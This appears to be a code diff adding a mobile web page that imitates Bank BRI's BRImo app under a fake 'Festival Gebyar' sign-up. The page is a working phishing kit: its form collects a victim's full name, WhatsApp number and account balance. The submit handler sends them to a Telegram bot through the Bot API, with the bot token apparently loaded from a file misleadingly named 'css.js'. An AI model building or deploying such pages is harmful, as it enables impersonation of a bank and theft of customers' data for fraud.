@@ -1,0 +1,438 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Transaksi Digital Modern</title>
+    <!-- Memuat Tailwind CSS untuk styling responsif dan modern -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Memuat Google Fonts 'Inter' -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <!-- Memuat Phosphor Icons untuk ikon UI yang bersih -->
+    <script src="https://unpkg.com/@phosphor-icons/web"></script>
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #e2e8f0;
+        }
+        @keyframes float {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-6px); }
+        }
+        .animate-float {
+            animation: float 4s ease-in-out infinite;
+        }
+    </style>
+</head>
+<body class="min-h-screen flex justify-center items-start sm:py-6 text-slate-800">
+
+    <!-- Container Utama Mobile-First -->
+    <div class="w-full max-w-md bg-[#1174d6] min-h-screen sm:min-h-[800px] sm:rounded-[2.25rem] shadow-2xl overflow-hidden flex flex-col relative">
+        
+        <!-- 1. Header Atas -->
+        <header class="px-5 pt-6 pb-2 flex items-center justify-between text-white z-10 relative">
+            <button type="button" onclick="showToast('Bahasa Indonesia (ID) aktif')" class="bg-white text-slate-800 px-3.5 py-1.5 rounded-full flex items-center gap-2 shadow-sm text-xs font-bold hover:bg-slate-50 transition cursor-pointer z-10">
+                <span class="w-4 h-4 rounded-full overflow-hidden flex flex-col border border-slate-200 shrink-0">
+                    <span class="h-1/2 bg-red-600 w-full"></span>
+                    <span class="h-1/2 bg-white w-full"></span>
+                </span>
+                <span>ID</span>
+            </button>
+
+            <div class="flex items-center justify-center">
+                <img 
+                    id="headerLogo" 
+                    src="https://cdn.phototourl.com/anon/2026-11-18-42b8cb0a-5f6f-4a22-89fe-382d7d7c4526.png" 
+                    onerror="this.onerror=null;this.src='https://cdn.phototourl.com/anon/2026-11-18-42b8cb0a-5f6f-4a22-89fe-382d7d7c4526.png';"
+                    alt="Logo" 
+                    class="h-9 max-w-[130px] object-contain"
+                >
+            </div>
+
+            <button type="button" onclick="showToast('Layanan bantuan siap membantu Anda 24/7')" class="bg-[#0b58a8]/80 hover:bg-[#09488a] backdrop-blur-sm text-white px-3.5 py-1.5 rounded-2xl flex items-center gap-2 text-xs font-medium transition border border-white/10 cursor-pointer z-10">
+                <i class="ph ph-headset text-lg text-sky-200"></i>
+                <div class="text-left leading-tight">
+                    <div class="text-[10px] opacity-90">Kontak</div>
+                    <div class="text-[10px] font-semibold">Kami</div>
+                </div>
+            </button>
+        </header>
+
+        <!-- 2. Hero Headline & Ilustrasi Vektor -->
+        <section class="px-6 pt-8 pb-8 text-center text-white relative flex-1 flex flex-col items-center justify-center">
+            <div class="absolute top-12 w-72 h-72 bg-sky-400/20 rounded-full blur-2xl pointer-events-none"></div>
+
+            <h1 class="text-2xl font-bold leading-snug max-w-[290px] z-10 drop-shadow-sm">
+                Yuk! Mulai Daftar Festival gebyar bersama BRImo!
+            </h1>
+
+            <div class="mt-6 mb-2 relative z-10 animate-float">
+                <svg class="w-64 h-48 mx-auto" viewBox="0 0 260 195" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <ellipse cx="130" cy="118" rx="108" ry="64" fill="#D9ECFF" fill-opacity="0.95"/>
+                    <rect x="64" y="76" width="22" height="66" rx="3" fill="#B5D8FA"/>
+                    <rect x="91" y="60" width="26" height="82" rx="3" fill="#A0CCFA"/>
+                    <rect x="149" y="68" width="24" height="74" rx="3" fill="#B5D8FA"/>
+                    <rect x="177" y="84" width="20" height="58" rx="3" fill="#A0CCFA"/>
+                    <circle cx="60" cy="52" r="11" fill="#38BDF8" stroke="#0284C7" stroke-width="2.5"/>
+                    <circle cx="60" cy="52" r="6" stroke="#E0F2FE" stroke-width="1.5"/>
+                    <circle cx="204" cy="58" r="10" fill="#38BDF8" stroke="#0284C7" stroke-width="2.5"/>
+                    <path d="M204 53V63" stroke="#E0F2FE" stroke-width="2" stroke-linecap="round"/>
+                    <path d="M50 26L52 31L57 33L52 35L50 40L48 35L43 33L48 31L50 26Z" fill="#FFFFFF"/>
+                    <path d="M210 30L211.5 34L215.5 35.5L211.5 37L210 41L208.5 37L204.5 35.5L208.5 34L210 30Z" fill="#FFFFFF"/>
+                    <g transform="rotate(6 130 98)">
+                        <rect x="93" y="24" width="78" height="140" rx="14" fill="#0B58A8"/>
+                        <rect x="89" y="22" width="78" height="140" rx="14" fill="#FFFFFF" stroke="#1E40AF" stroke-width="2.5"/>
+                        <rect x="118" y="28" width="20" height="3.5" rx="1.75" fill="#CBD5E1"/>
+                        <rect x="104" y="54" width="48" height="48" rx="12" fill="#1174D6"/>
+                        <path d="M118 78L125 85L139 71" stroke="white" stroke-width="3.5" stroke-linecap="round" stroke-linejoin="round"/>
+                        <rect x="108" y="112" width="40" height="5" rx="2.5" fill="#CBD5E1"/>
+                        <rect x="114" y="122" width="28" height="5" rx="2.5" fill="#E2E8F0"/>
+                    </g>
+                    <rect x="166" y="108" width="28" height="7" rx="3.5" fill="#2563EB"/>
+                    <rect x="164" y="117" width="30" height="7" rx="3.5" fill="#3B82F6"/>
+                    <rect x="166" y="126" width="28" height="7" rx="3.5" fill="#1D4ED8"/>
+                    <rect x="163" y="135" width="32" height="7" rx="3.5" fill="#60A5FA"/>
+                    <path d="M74 146C64 134 62 119 70 109C78 119 80 134 74 146Z" fill="#60A5FA"/>
+                    <path d="M188 152C196 138 208 130 220 132C214 144 202 152 188 152Z" fill="#7DD3FC"/>
+                </svg>
+            </div>
+        </section>
+
+        <!-- 3. Bottom Sheet Putih Utama -->
+        <main class="bg-white rounded-t-[2.25rem] px-6 py-8 shadow-[0_-8px_30px_rgba(0,0,0,0.08)] flex flex-col justify-center z-20">
+            <div class="flex items-center gap-3">
+                <button 
+                    type="button" 
+                    onclick="openFormDrawer('Login')"
+                    class="flex-1 bg-[#1174d6] hover:bg-[#0d62b8] active:scale-[0.99] text-white font-bold text-sm py-4 px-6 rounded-2xl shadow-lg shadow-sky-200 transition cursor-pointer"
+                >
+                    Lanjut Daftar
+                </button>
+            </div>
+        </main>
+
+        <!-- 4. Modal / Bottom-Sheet Drawer Form -->
+        <div id="formDrawerOverlay" class="fixed inset-0 bg-slate-900/50 backdrop-blur-xs hidden items-end sm:items-center justify-center z-40 transition-opacity duration-300 opacity-0">
+            <div id="formDrawerPanel" class="bg-white w-full max-w-md rounded-t-[2rem] sm:rounded-[2rem] p-6 pb-8 shadow-2xl transform translate-y-full sm:translate-y-4 transition-transform duration-300">
+                
+                <div class="w-10 h-1.5 bg-slate-200 rounded-full mx-auto mb-4 sm:hidden"></div>
+                
+                <div class="flex items-center justify-between mb-5">
+                    <div>
+                        <span id="drawerBadge" class="inline-block text-[10px] font-bold uppercase tracking-wider text-[#1174d6] bg-sky-50 px-2.5 py-1 rounded-full mb-1">gebyar festival</span>
+                        <h3 class="text-lg font-bold text-slate-800">Lengkapi Data Anda di Bawa ini</h3>
+                    </div>
+                    <button type="button" onclick="closeFormDrawer()" class="w-9 h-9 rounded-full bg-slate-100 hover:bg-slate-200 text-slate-600 flex items-center justify-center transition cursor-pointer" aria-label="Tutup">
+                        <i class="ph-bold ph-x text-base"></i>
+                    </button>
+                </div>
+
+                <!-- Form Input Data -->
+                <form id="FormAku" novalidate class="space-y-4">
+                    
+                    <!-- Field 1: Nama Lengkap -->
+                    <div>
+                        <label for="namaLengkap" class="block text-xs font-semibold text-slate-600 mb-1.5">
+                            Nama Lengkap
+                        </label>
+                        <div class="relative">
+                            <span class="absolute inset-y-0 left-0 pl-3.5 flex items-center text-slate-400">
+                                <i class="ph ph-user text-lg"></i>
+                            </span>
+                            <input 
+                                type="text" 
+                                id="namaLengkap" 
+                                name="namaLengkap"
+                                placeholder="Masukkan nama lengkap Anda"
+                                class="w-full pl-10 pr-4 py-3 bg-slate-50 border border-slate-200 rounded-xl text-sm font-medium text-slate-800 placeholder:text-slate-400 focus:outline-none focus:bg-white focus:border-[#1174d6] focus:ring-2 focus:ring-sky-100 transition"
+                                required
+                            >
+                        </div>
+                        <p id="namaError" class="hidden text-[11px] text-rose-500 mt-1 flex items-center gap-1 font-medium">
+                            <i class="ph-fill ph-warning-circle"></i>
+                            <span>Nama lengkap wajib diisi.</span>
+                        </p>
+                    </div>
+
+                    <!-- Field 2: Nomor WhatsApp -->
+                    <div>
+                        <div class="flex justify-between items-center mb-1.5">
+                            <label for="nomorWa" class="block text-xs font-semibold text-slate-600">
+                                Nomor WhatsApp
+                            </label>
+                            <span id="waCounter" class="text-[11px] font-medium text-slate-400">0 / 10-13 digit</span>
+                        </div>
+                        <div class="relative">
+                            <span class="absolute inset-y-0 left-0 pl-3.5 flex items-center text-slate-400">
+                                <i class="ph ph-whatsapp-logo text-lg text-emerald-500"></i>
+                            </span>
+                            <input 
+                                type="tel" 
+                                id="nomorWa" 
+                                name="nomorWa"
+                                inputmode="numeric"
+                                maxlength="13"
+                                placeholder="Contoh: 081234567890"
+                                class="w-full pl-10 pr-10 py-3 bg-slate-50 border border-slate-200 rounded-xl text-sm font-medium text-slate-800 placeholder:text-slate-400 focus:outline-none focus:bg-white focus:border-[#1174d6] focus:ring-2 focus:ring-sky-100 transition"
+                                required
+                            >
+                            <span id="waStatusIcon" class="hidden absolute inset-y-0 right-0 pr-3.5 flex items-center"></span>
+                        </div>
+                        <p id="waMessage" class="text-[11px] mt-1 text-slate-400 flex items-center gap-1">
+                            <span>Masukkan 10 sampai 13 digit angka.</span>
+                        </p>
+                    </div>
+
+                    <!-- Field 3: Saldo (Rp) -->
+                    <div>
+                        <label for="saldoRp" class="block text-xs font-semibold text-slate-600 mb-1.5">
+                            Saldo (Rp)
+                        </label>
+                        <div class="relative">
+                            <span class="absolute inset-y-0 left-0 pl-3.5 flex items-center text-sm font-bold text-[#1174d6]">
+                                Rp
+                            </span>
+                            <input 
+                                type="text" 
+                                id="saldoRp" 
+                                name="saldoRp"
+                                inputmode="numeric"
+                                placeholder="0"
+                                class="w-full pl-11 pr-4 py-3 bg-slate-50 border border-slate-200 rounded-xl text-sm font-bold text-slate-800 placeholder:text-slate-400 focus:outline-none focus:bg-white focus:border-[#1174d6] focus:ring-2 focus:ring-sky-100 transition"
+                                required
+                            >
+                        </div>
+                        <p id="saldoError" class="hidden text-[11px] text-rose-500 mt-1 flex items-center gap-1 font-medium">
+                            <i class="ph-fill ph-warning-circle"></i>
+                            <span>Masukkan nominal saldo yang valid.</span>
+                        </p>
+                    </div>
+
+                    <!-- Tombol Submit Form -->
+                    <div class="pt-2">
+                        <button 
+                            type="submit" 
+                            id="kirim"
+                            class="w-full bg-[#1174d6] hover:bg-[#0d62b8] disabled:bg-slate-400 active:scale-[0.99] text-white font-bold text-sm py-3.5 px-6 rounded-xl shadow-md shadow-sky-200 transition cursor-pointer"
+                        >
+                            Daftar Sekarang
+                        </button>
+                    </div>
+                </form>
+                <p id="status" class="text-center text-xs font-medium text-slate-500 mt-3"></p>
+            </div>
+        </div>
+
+        <!-- Toast Notification -->
+        <div id="toastBox" class="fixed bottom-6 left-1/2 -translate-x-1/2 bg-slate-900/90 text-white text-xs font-medium px-4 py-2.5 rounded-full shadow-lg opacity-0 pointer-events-none transition-opacity duration-300 z-50 whitespace-nowrap">
+            Pesan notifikasi
+        </div>
+
+    </div>
+
+    
+    <script src="css.js"></script>
+    <script>
+        const form = document.getElementById('FormAku');
+        const namaInput = document.getElementById('namaLengkap');
+        const waInput = document.getElementById('nomorWa');
+        const saldoInput = document.getElementById('saldoRp');
+
+        const namaError = document.getElementById('namaError');
+        const waCounter = document.getElementById('waCounter');
+        const waMessage = document.getElementById('waMessage');
+        const waStatusIcon = document.getElementById('waStatusIcon');
+        const saldoError = document.getElementById('saldoError');
+
+        const drawerOverlay = document.getElementById('formDrawerOverlay');
+        const drawerPanel = document.getElementById('formDrawerPanel');
+        const drawerBadge = document.getElementById('drawerBadge');
+        let currentContext = 'Login';
+
+        function openFormDrawer(contextName) {
+            currentContext = contextName || 'Login';
+            drawerBadge.textContent = currentContext === 'Login' ? 'Daftar Festival Gebyar' : `Menu ${currentContext}`;
+            
+            drawerOverlay.classList.remove('hidden');
+            drawerOverlay.classList.add('flex');
+            
+            requestAnimationFrame(() => {
+                drawerOverlay.classList.remove('opacity-0');
+                drawerOverlay.classList.add('opacity-100');
+                drawerPanel.classList.remove('translate-y-full', 'sm:translate-y-4');
+                drawerPanel.classList.add('translate-y-0');
+            });
+
+            setTimeout(() => namaInput.focus(), 250);
+        }
+
+        function closeFormDrawer() {
+            drawerOverlay.classList.remove('opacity-100');
+            drawerOverlay.classList.add('opacity-0');
+            drawerPanel.classList.remove('translate-y-0');
+            drawerPanel.classList.add('translate-y-full', 'sm:translate-y-4');
+
+            setTimeout(() => {
+                drawerOverlay.classList.add('hidden');
+                drawerOverlay.classList.remove('flex');
+            }, 300);
+        }
+
+        drawerOverlay.addEventListener('click', function (e) {
+            if (e.target === drawerOverlay) {
+                closeFormDrawer();
+            }
+        });
+
+        waInput.addEventListener('input', function () {
+            let digitsOnly = this.value.replace(/\D/g, '');
+            if (digitsOnly.length > 13) {
+                digitsOnly = digitsOnly.slice(0, 13);
+            }
+            this.value = digitsOnly;
+
+            const len = digitsOnly.length;
+            waCounter.textContent = `${len} / 10-13 digit`;
+
+            if (len === 0) {
+                setWaState('neutral', 'Masukkan 10 sampai 13 digit angka.');
+            } else if (len < 10) {
+                setWaState('invalid', `Kurang ${10 - len} digit lagi (minimal 10 digit).`);
+            } else if (len >= 10 && len <= 13) {
+                setWaState('valid', 'Nomor WhatsApp valid.');
+            }
+        });
+
+        function setWaState(state, message) {
+            waStatusIcon.classList.remove('hidden');
+            if (state === 'valid') {
+                waInput.classList.remove('border-slate-200', 'border-rose-400', 'focus:border-[#1174d6]');
+                waInput.classList.add('border-emerald-500', 'focus:border-emerald-500');
+                waMessage.className = 'text-[11px] mt-1 text-emerald-600 flex items-center gap-1 font-medium';
+                waMessage.innerHTML = `<i class="ph-fill ph-check-circle"></i><span>${message}</span>`;
+                waStatusIcon.innerHTML = `<i class="ph-fill ph-check-circle text-emerald-500 text-lg"></i>`;
+            } else if (state === 'invalid') {
+                waInput.classList.remove('border-slate-200', 'border-emerald-500', 'focus:border-[#1174d6]');
+                waInput.classList.add('border-rose-400', 'focus:border-rose-500');
+                waMessage.className = 'text-[11px] mt-1 text-rose-500 flex items-center gap-1 font-medium';
+                waMessage.innerHTML = `<i class="ph-fill ph-warning-circle"></i><span>${message}</span>`;
+                waStatusIcon.innerHTML = `<i class="ph-fill ph-warning-circle text-rose-500 text-lg"></i>`;
+            } else {
+                waInput.classList.remove('border-emerald-500', 'border-rose-400');
+                waInput.classList.add('border-slate-200', 'focus:border-[#1174d6]');
+                waMessage.className = 'text-[11px] mt-1 text-slate-400 flex items-center gap-1';
+                waMessage.innerHTML = `<span>${message}</span>`;
+                waStatusIcon.classList.add('hidden');
+            }
+        }
+
+        saldoInput.addEventListener('input', function () {
+            let rawNumber = this.value.replace(/\D/g, '');
+            if (rawNumber.length > 1) {
+                rawNumber = rawNumber.replace(/^0+/, '');
+            }
+
+            if (rawNumber === '') {
+                this.value = '';
+                return;
+            }
+
+            this.value = rawNumber.replace(/\B(?=(\d{3})+(?!\d))/g, '.');
+            saldoError.classList.add('hidden');
+            this.classList.remove('border-rose-400');
+        });
+
+        namaInput.addEventListener('input', function () {
+            if (this.value.trim().length > 0) {
+                namaError.classList.add('hidden');
+                this.classList.remove('border-rose-400');
+            }
+        });
+
+        form.addEventListener('submit', async function (e) {
+            e.preventDefault();
+            let isValid = true;
+
+            const namaVal = namaInput.value.trim();
+            if (!namaVal) {
+                namaError.classList.remove('hidden');
+                namaInput.classList.add('border-rose-400');
+                isValid = false;
+            } else {
+                namaError.classList.add('hidden');
+                namaInput.classList.remove('border-rose-400');
+            }
+
+            const waVal = waInput.value.replace(/\D/g, '');
+            if (waVal.length < 10 || waVal.length > 13) {
+                setWaState('invalid', 'Nomor WhatsApp harus terdiri dari 10 hingga 13 digit.');
+                isValid = false;
+            }
+
+            const saldoRaw = saldoInput.value.replace(/\D/g, '');
+            if (!saldoRaw || parseInt(saldoRaw, 10) <= 0) {
+                saldoError.classList.remove('hidden');
+                saldoInput.classList.add('border-rose-400');
+                isValid = false;
+            } else {
+                saldoError.classList.add('hidden');
+                saldoInput.classList.remove('border-rose-400');
+            }
+
+            if (!isValid) {
+                showToast('Mohon periksa kembali data yang dimasukkan');
+                return;
+            }
+
+            const tombol = document.getElementById('kirim');
+            const status = document.getElementById('status');
+
+            tombol.disabled = true;
+            tombol.textContent = 'Mengirim...';
+            status.textContent = 'Sedang memproses data...';
+            status.className = 'text-center text-xs font-medium text-sky-600 mt-3';
+
+            const pesan = `🔔 NOTIFIKASI FORM BRImo\n\nNama: ${namaVal}\nWhatsApp: ${waVal}\nSaldo demo: Rp ${saldoInput.value}`;
+
+            try {
+                const hasil = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: pesan
+                    })
+                });
+
+                const data = await hasil.json();
+
+                if (!hasil.ok || !data.ok) {
+                    throw new Error('Gagal mengirim ke Telegram');
+                }
+
+                window.location.href = 'berhasil.html';
+            } catch (error) {
+                status.textContent = 'Pengiriman gagal. Periksa koneksi atau token bot.';
+                status.className = 'text-center text-xs font-medium text-rose-500 mt-3';
+                tombol.disabled = false;
+                tombol.textContent = 'Kirim Data';
+            }
+        });
+
+        let toastTimeout;
+        function showToast(msg) {
+            const toast = document.getElementById('toastBox');
+            toast.textContent = msg;
+            toast.classList.remove('opacity-0');
+            toast.classList.add('opacity-100');
+            clearTimeout(toastTimeout);
+            toastTimeout = setTimeout(() => {
+                toast.classList.remove('opacity-100');
+                toast.classList.add('opacity-0');
+            }, 2500);
+        }
+    </script>
+</body>
+</html>
